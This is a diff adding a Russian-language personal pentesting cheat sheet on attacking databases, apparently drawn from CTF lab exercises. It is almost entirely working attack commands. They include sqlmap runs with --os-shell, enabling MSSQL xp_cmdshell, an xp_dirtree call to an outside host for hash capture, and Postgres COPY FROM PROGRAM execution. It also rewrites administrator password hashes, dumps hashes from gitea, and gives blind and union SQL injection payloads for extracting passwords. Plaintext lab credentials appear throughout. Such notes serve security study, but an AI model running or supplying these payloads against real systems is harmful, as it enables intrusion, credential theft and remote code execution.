@@ -1,1 +1,206 @@
 # SQL
+# sqlmap
+
+    Если нужно кокретно какйто парамаетр проверить то вместь него ставим * - сохраняем в файл --> sqlmap -r id_rquest.txt --batch 
+
+Смотри. Этот алгоритм важно запомнить:
+
+    Сначала сканишь бdазы флагом --dbs
+     Выбираешь базу флагом -D и сканишь таблицы в ней флагом --tables
+     Выбираешь базу -D,  таблицу -Т и дампишь ее целиком --dump
+     Либо смотришь на колонки, если нужно определенные извлечь флагом --columns, после чего выбираешь колонку -C и дампишь выборочно.
+
+# сканирование методом POST
+
+sqlmap -u <URL> --forms --batch --random-agent --dbs
+
+
+
+sqlmap -u "http://51.250.73.193:5008/" --data="username=admin23&password=aaa" --dbs --flush-session
+
+--flush-session     Flush session files for current target(сброс кеша)
+
+В Burp Copy to file запрос. в sqlmap -r файл с запросом -p параметр-уязвимый --затем опции. Пример с TryHackMe sqlmap -r req.txt -p blood_group --dbs.
+substring(database(),2,1)='B'
+
+https://tryhackme.com/room/sqlmap - пример использования с подгрузкой файла
+
+sqlmap -u 'http://10.129.237.210/dashboard.php?search=FERA' --batch --random-agent --cookie='PHPSESSID=6et2iplhe59a7h6m2v55vjn49s' --os-shell
+
+
+# MYSQL server
+
+mysql -h 123.123.131.131 -u root -p
+
+mysql -u bolt_dba -p
+
+        запуск оболочки \! /bin/sh
+
+SHOW databases; : Prints out the databases we can access.
+USE {database_name}; : Set to use the database named {database_name}.
+SHOW tables; : Prints out the available tables inside the current
+database.
+SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.
+describe Users;
+update {table_name} set {user_pass} = MD5('password123') where ID = 1;
+
+# Подключение к mysql из нутри
+
+mysql --host=db --user=root --password=root cacti -e "show tables"
+mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
+
+mysql --user=root -p 
+
+mysql -u 'roundcube' -p'RCDBPass2025' roundcube -e "show tables; select * from users "
+
+select * from wp_users \G (в удобном виде)
+
+update wp_users set user_pass='$P$Bn.uHsPKseIJ4CdDVxOiQKmXFHrkC1.' where id=1;
+
+update (tables_name) set (column_password_nmae)='$P$Bn.uHsPKseIJ4CdDVxOiQKmXFHrkC1.' where id=1;
+
+# MySqlDUMP
+
+mysqldump -u theseus(user) -p Magic(datab)
+
+
+
+# Подключение к БД windows microsoft sql service (MSSQL)
+
+        sqsh -S 10.129.20.13 -U username -P Password123
+
+mssqlclient.py 'reporting:PcwTWTHRwryjc$c6'@10.10.10.125 -db volume -windows-auth
+
+impacket-mssqlclient ARCHETYPE/sql_svc@10.129.21.3 -windows-auth
+
+impacket-mssqlclient dc1.scrm.local -k (по керберосу)
+---перед этим 
+
+impacket-getTGT scrm.local/sqlsvc:Pegasus60
+
+export KRB5CCNAME=sqlsvc.ccache
+
+или по TGS - также но с генерацией TGS
+
+---Включить вполнени xp_cmdshell
+
+enable_xp_cmdshell
+
+reconfigure
+
+xp_cmdshell
+
+xp_dirtree "\\10.10.14.42\sass"  --- перейти по адресу с аутентификацией
+
+exec xp_dirtree 'c:/';
+
+********************
+select name from sys.databases;  (перечислить все базы данных)
+
+select TABLE_NAME from ScrambleHR.INFORMATION_SCHEMA.TABLES;
+
+select * from ScrambleHR.dbo.Employees; (выбрать все из таблицы ScramblerHR)
+
+select * from wp_users \G (в удобном виде)
+
+describe wp_users; (описать таблицу)
+
+# mongodb
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
+
+снаружи
+
+mongo mongodb://10.129.142.102:27017
+
+show dbs;
+use {dbs_name};
+show collections;
+show tables;
+
+db.{collect_name}.find().pretty();
+
+select * from wp_users \G (в удобном виде)
+
+сдампить монго 
+       
+        mongodump
+
+        bsondump users.bson |jq .
+
+# postgres
+
+psql -U christine -h localhost -p 4444
+
+\l - список таблиц
+
+\с - конект с таблицей
+
+\dt - выгрузить таблицу
+
+select * from flag; - и так понятно
+
+psql -h 192.168.135.7 -U postgres -W 'XzB.4fx4+LSHWsK' -d cats
+
+SELECT current_setting('is_superuser'); -- Проверка суперпользователя
+
+CREATE TABLE exec(cmd_output text);
+
+COPY exec FROM PROGRAM 'id';
+
+select * from exec;
+
+'';SELECT tablename  FROM pg_tables;
+''; (SELECT password FROM "Users") --
+
+# SQLITE (python jinja)
+
+sqlite3 db.sqlite
+
+select * from User
+
+.dump
+
+select * from NOTE;
+
+ вытянуть все       sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
+
+# MariaDB
+
+        mysql -h 127.0.0.1 -u root -p'ibWijteig5'
+        mysql -h 127.0.0.1 -u root -p'ibWijteig5' -e "SHOW DATABASES;"
+        $ mysql -h 127.0.0.1 -u root -p'ibWijteig5' outputwall -e "SHOW TABLES;"
+        mysql> SELECT LOAD_FILE('C:\\Users\\Administrator\\Desktop\\root.txt');
+
+# SQL I
+    # Union based   
+        search=example' ORDER BY 1 --
+        search=example' UNION SELECT 'any_string',NULL,NULL,NULL --
+   
+    # Boolean-Based Blind SQLi
+        - определеие таблиц
+        TrackingId=xyUauUD0CUhPTyX70vz'||(SELECT '' FROM user WHERE ROWNUM = 1)||'
+        
+        - определение пользователя
+        TrackingId=UauUD0CUhPTyX70v'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+        
+        - определеие длинны пароля
+        '||(SELECT CASE WHEN LENGTH(password)=1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+        -перебор символов пароля
+        '||(SELECT CASE WHEN SUBSTR(password,N,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+    # Time-Based Blind SQLi
+        -определение колонок
+        =as';SELECT CASE WHEN EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name = 'products' AND column_name = 'id') THEN pg_sleep(5) ELSE pg_sleep(0) END--
+        -определение длинны пароля 
+        =x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM+users-- 
+
+    # Out-of-Band Blind SQLi
+
+    # Second-Order SQLi
+        
+# No SQL injection
+
+https://notes.incendium.rocks/pentesting-notes/web/injection/cypher-injection
